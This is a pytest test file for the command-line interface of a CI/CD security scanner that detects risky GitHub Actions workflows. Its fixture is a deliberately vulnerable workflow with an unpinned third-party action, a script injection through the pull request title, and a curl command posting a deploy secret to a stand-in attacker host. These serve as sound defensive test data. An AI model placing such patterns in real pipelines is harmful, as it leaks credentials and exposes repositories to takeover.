"""CLI tests. Every command must work offline and without an API key."""

from __future__ import annotations

import json
from io import StringIO
from pathlib import Path

import pytest

from supplytrace.cicd.cli import EXIT_FINDINGS, EXIT_OK, main

VULNERABLE = """\
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: evil/action@main
      - env:
          TOKEN: ${{ secrets.DEPLOY_KEY }}
        run: |
          echo "pr ${{ github.event.pull_request.title }}"
          curl -X POST -d "t=$TOKEN" https://evil.test/collect
"""


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    directory = tmp_path / ".github" / "workflows"
    directory.mkdir(parents=True)
    (directory / "wf.yml").write_text(VULNERABLE, encoding="utf-8")
    return tmp_path


def run(*argv: str) -> tuple[int, str]:
    out = StringIO()
    code = main(list(argv), out=out)
    return code, out.getvalue()


class TestScan:
    def test_scan_reports_findings_and_paths(self, repo: Path) -> None:
        code, output = run("scan", str(repo), "--no-llm", "--no-history")
        assert code == EXIT_OK
        assert "CI/CD SECURITY ANALYSIS" in output
        assert "FINDINGS" in output
        assert "ATTACK PATHS" in output
        assert "SCRIPT_INJECTION" in output

    def test_scan_never_claims_an_attack_occurred(self, repo: Path) -> None:
        _, output = run("scan", str(repo), "--no-llm", "--no-history")
        assert "EXISTS IN THE CONFIGURATION" in output
        assert "has not established that anyone has taken it" in output

    def test_no_llm_skips_the_model_entirely(self, repo: Path, monkeypatch) -> None:
        """Must hold even when a key is present in the environment."""

        monkeypatch.setenv("GEMINI_API_KEY", "would-fail-if-used")
        code, output = run("scan", str(repo), "--no-llm", "--no-history")
        assert code == EXIT_OK
        assert "LLM CORRELATION" not in output

    def test_without_a_key_the_llm_step_reports_being_skipped(
        self, repo: Path, monkeypatch
    ) -> None:
        for variable in ("GEMINI_API_KEY", "GOOGLE_API_KEY"):
            monkeypatch.delenv(variable, raising=False)
        code, output = run("scan", str(repo), "--no-history")
        assert code == EXIT_OK
        assert "LLM CORRELATION" in output
        assert "skipped" in output
        # The deterministic half is unaffected.
        assert "SCRIPT_INJECTION" in output

    def test_json_output_is_valid_and_complete(self, repo: Path) -> None:
        code, output = run(
            "scan", str(repo), "--no-llm", "--no-history", "--format", "json"
        )
        assert code == EXIT_OK
        payload = json.loads(output)
        assert payload["findings"]
        assert payload["attack_paths"]
        assert payload["exit_criteria"]["critical"] >= 1
        for finding in payload["findings"]:
            assert finding["evidence"], "a finding was serialised without evidence"

    def test_markdown_output_renders(self, repo: Path) -> None:
        code, output = run(
            "scan", str(repo), "--no-llm", "--no-history", "--format", "markdown"
        )
        assert code == EXIT_OK
        assert output.startswith("# CI/CD security analysis")
        assert "| Severity | ID |" in output

    def test_fail_on_returns_a_distinct_exit_code(self, repo: Path) -> None:
        code, _ = run(
            "scan", str(repo), "--no-llm", "--no-history", "--fail-on", "CRITICAL"
        )
        assert code == EXIT_FINDINGS

    def test_fail_on_passes_for_a_clean_repository(self, tmp_path: Path) -> None:
        directory = tmp_path / ".github" / "workflows"
        directory.mkdir(parents=True)
        (directory / "ok.yml").write_text(
            "on: push\n"
            "permissions:\n  contents: read\n"
            "jobs:\n  a:\n    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n"
            "      - run: echo build\n",
            encoding="utf-8",
        )
        code, _ = run(
            "scan", str(tmp_path), "--no-llm", "--no-history", "--fail-on", "HIGH"
        )
        assert code == EXIT_OK

    def test_min_severity_filters(self, repo: Path) -> None:
        _, output = run(
            "scan", str(repo), "--no-llm", "--no-history",
            "--format", "json", "--min-severity", "CRITICAL",
        )
        payload = json.loads(output)
        assert {f["severity"] for f in payload["findings"]} == {"CRITICAL"}

    def test_output_file_is_written(self, repo: Path, tmp_path: Path) -> None:
        target = tmp_path / "out" / "report.json"
        code, _ = run(
            "scan", str(repo), "--no-llm", "--no-history",
            "--format", "json", "--output", str(target),
        )
        assert code == EXIT_OK
        assert json.loads(target.read_text(encoding="utf-8"))["findings"]


class TestGraph:
    def test_graph_exports_every_format(self, repo: Path, tmp_path: Path) -> None:
        out = tmp_path / "graph"
        code, output = run(
            "graph", str(repo), "--no-history", "--output-dir", str(out)
        )
        assert code == EXIT_OK
        assert (out / "attack_graph.json").is_file()
        assert (out / "attack_graph.graphml").is_file()
        assert (out / "attack_graph.dot").is_file()
        assert "attack graph:" in output

        payload = json.loads((out / "attack_graph.json").read_text(encoding="utf-8"))
        assert payload["nodes"] and payload["edges"]
        assert payload["attack_paths"]


class TestAnalyzeAndRules:
    def test_analyze_shows_evidence_and_remediation(self, repo: Path) -> None:
        code, output = run("analyze", str(repo), "--no-history")
        assert code == EXIT_OK
        assert "DETERMINISTIC ANALYSIS" in output
        assert "evidence:" in output
        assert "remediation:" in output

    def test_analyze_can_filter_to_one_rule(self, repo: Path) -> None:
        _, output = run(
            "analyze", str(repo), "--no-history", "--rule", "SCRIPT_INJECTION"
        )
        assert "SCRIPT_INJECTION" in output
        assert "ACTION_UNPINNED" not in output

    def test_rules_lists_every_rule(self) -> None:
        code, output = run("rules")
        assert code == EXIT_OK
        for rule_id in (
            "ACTION_UNPINNED",
            "EXCESSIVE_PERMISSIONS",
            "DANGEROUS_TRIGGER",
            "SCRIPT_INJECTION",
            "SECRET_EXPOSURE",
            "REMOTE_CODE_FETCH",
            "UNTRUSTED_CODE_EXECUTION",
            "ARTIFACT_TAMPERING",
            "RELEASE_RISK",
            "THIRD_PARTY_ACTION",
        ):
            assert rule_id in output

    def test_rules_explain_gives_the_reasoning(self) -> None:
        code, output = run("rules", "--explain", "ACTION_UNPINNED")
        assert code == EXIT_OK
        assert "mutable pointer" in output


class TestRobustness:
    def test_a_repository_with_no_workflows_is_not_an_error(self, tmp_path: Path) -> None:
        code, output = run("scan", str(tmp_path), "--no-llm", "--no-history")
        assert code == EXIT_OK
        assert "No findings" in output

    def test_a_missing_path_is_a_clean_error(self, tmp_path: Path) -> None:
        code, _ = run("scan", str(tmp_path / "nope"), "--no-llm", "--no-history")
        assert code != EXIT_OK

    def test_a_directory_that_is_not_a_git_repo_still_scans(self, repo: Path) -> None:
        """History is optional; the workflow rules do not need it."""

        code, output = run("scan", str(repo), "--no-llm")
        assert code == EXIT_OK
        assert "FINDINGS" in output

    def test_cicd_detector_entry_point_is_the_same_cli(self) -> None:
        import cicd_detector

        assert cicd_detector.main is main
